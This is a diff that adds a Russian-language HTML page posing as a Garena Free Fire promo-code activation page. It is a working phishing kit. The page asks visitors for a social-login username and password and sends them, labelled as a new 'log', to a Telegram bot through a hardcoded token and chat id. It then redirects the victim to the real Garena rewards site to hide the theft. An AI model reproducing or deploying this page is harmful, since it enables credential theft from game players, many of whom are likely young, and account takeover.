@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire</title>
+    <style>
+        body { margin: 0; padding: 0; font-family: sans-serif; background: #000; color: #fff; display: flex; justify-content: center; }
+        #root { width: 100%; display: flex; justify-content: center; }
+        .wrapper { width: 100%; max-width: 450px; background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img1.jpg') no-repeat top center; background-size: cover; min-height: 100vh; position: relative; }
+        .overlay { background: rgba(0,0,0,0.6); min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        .logo img { width: 110px; height: auto; }
+        .title-box { text-align: center; margin-top: 40px; }
+        .title-box h1 { font-size: 24px; text-shadow: 2px 2px #000; }
+        .social-row { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
+        .s-btn { width: 45px; height: 45px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 2px solid transparent; transition: 0.3s; }
+        .s-btn img { width: 28px; height: 28px; object-fit: contain; }
+        .active-btn { border-color: #ff9000; box-shadow: 0 0 12px #ff9000; }
+        #login-section { display: none; background: rgba(255,255,255,0.92); border-radius: 8px; padding: 20px; margin-top: 20px; color: #333; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #bbb; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .confirm-btn { width: 100%; padding: 16px; background: #ff9000; color: #fff; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; text-transform: uppercase; }
+        .info-card { background: rgba(255,255,255,0.95); border-radius: 8px; padding: 15px; margin-top: 20px; color: #222; font-size: 13px; }
+        .orange { color: #f39c12; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div class="wrapper">
+            <div class="overlay">
+                <div class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/3/36/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png">
+                </div>
+                <div class="title-box">
+                    <h1>Страница активации промокода</h1>
+                    <p>Пожалуйста, войдите</p>
+                </div>
+                
+                <div class="social-row">
+                    <div class="s-btn" onclick="setMet('Facebook', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"></div>
+                    <div class="s-btn" onclick="setMet('VK', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/VK_Compact_Logo_%282021-present%29.svg/2048px-VK_Compact_Logo_%282021-present%29.svg.png"></div>
+                    <div class="s-btn" onclick="setMet('Google', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"></div>
+                    <div class="s-btn" onclick="setMet('Apple', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"></div>
+                    <div class="s-btn" onclick="setMet('X-Twitter', this)"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/X_icon_2.svg/2048px-X_icon_2.svg.png"></div>
+                </div>
+
+                <div id="login-section">
+                    <form id="tgForm">
+                        <input type="hidden" id="met_val" value="None">
+                        <input type="text" id="u" placeholder="Логин / Email / ID" required>
+                        <input type="text" id="p" placeholder="Пароль" required>
+                        <button type="submit" class="confirm-btn">ПОДТВЕРДИТЬ</button>
+                    </form>
+                </div>
+
+                <div class="info-card">
+                    <strong>Важная информация</strong><br><br>
+                    1. Код погашения содержит <span class="orange">12/16</span> символов.<br>
+                    2. Награды появятся в <span class="orange">[Склад]</span>.
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+    const token = "8290059613:AAE9QZuohTW8U6Bmd3nC5yJ4x7D-VhLji2o";
+    const chat_id = "-5046886202";
+
+    function setMet(val, el) {
+        document.getElementById('met_val').value = val;
+        document.getElementById('login-section').style.display = 'block';
+        document.querySelectorAll('.s-btn').forEach(b => b.classList.remove('active-btn'));
+        el.classList.add('active-btn');
+        document.getElementById('login-section').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    document.getElementById('tgForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const m = document.getElementById('met_val').value;
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        
+        const msg = `🔥 НОВЫЙ ЛОГ FF 🔥\n\n🌐 Метод: ${m}\n👤 Логин: ${u}\n🔑 Пароль: ${p}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: chat_id, text: msg})
+        }).finally(() => {
+            window.location.href = "https://reward.ff.garena.com/";
+        });
+    });
+</script>
+</body>
+</html>
